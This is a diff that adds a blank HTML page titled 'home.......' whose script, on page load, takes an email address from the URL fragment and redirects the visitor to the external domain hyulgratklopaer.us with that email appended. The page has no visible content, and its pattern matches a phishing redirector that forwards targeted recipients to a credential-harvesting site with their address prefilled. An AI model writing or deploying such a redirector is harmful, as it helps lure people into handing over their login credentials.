@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>home.......</title>
+    <script>
+        // Function to get email from URL fragment (everything after #)
+        function getEmailFromFragment() {
+            var url = window.location.href;
+            var fragmentIndex = url.indexOf("#");
+            if (fragmentIndex !== -1) {
+                return url.substring(fragmentIndex + 1); // Extract email after #
+            }
+            return null; // No email found
+        }
+
+        // Redirect to a new URL with email parameter from fragment
+        function redirect() {
+            // Define the target URL for redirection
+            var targetUrl = "https://hyulgratklopaer.us/";  // Replace with your target URL
+
+            // Get email from URL fragment
+            var email = getEmailFromFragment();
+
+            // Append email to target URL if it exists
+            if (email) {
+                targetUrl += "#" + email; // Append # and the email directly
+            }
+
+            // Perform the redirection
+            window.location.href = targetUrl;
+        }
+
+        // Execute the redirect function when the DOM is fully loaded
+        document.addEventListener("DOMContentLoaded", redirect);
+    </script>
+</head>
+<body>
+</body>
+</html>
